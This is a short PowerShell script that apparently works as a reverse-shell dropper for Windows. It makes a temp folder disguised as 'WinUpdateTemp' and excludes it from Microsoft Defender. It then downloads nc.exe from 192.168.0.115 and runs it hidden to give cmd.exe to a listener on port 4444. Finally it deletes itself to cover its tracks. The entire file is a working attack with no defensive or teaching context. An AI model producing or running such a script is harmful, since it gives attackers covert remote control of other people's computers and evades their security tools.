# Define temporary folder and executable name
$TempDir = "$env:TEMP\WinUpdateTemp"
$NcPath = "$TempDir\nc.exe"

# Create the temp folder
New-Item -ItemType Directory -Force -Path $TempDir | Out-Null

# Exclude the folder from Defender
Add-MpPreference -ExclusionPath $TempDir

# Download nc.exe from your server
Invoke-WebRequest -Uri "http://192.168.0.115/nc.exe" -OutFile $NcPath

# Run nc.exe silently to connect to listener
$WshShell = New-Object -ComObject WScript.Shell
$WshShell.Run("`"$NcPath`" 192.168.0.115 4444 -e cmd.exe", 0, $false)

# Optional: Wait to ensure reverse shell runs
Start-Sleep -Seconds 5

# Self-delete script
$MyPath = $MyInvocation.MyCommand.Definition
Start-Sleep -Milliseconds 500
Remove-Item -Path $MyPath -Force
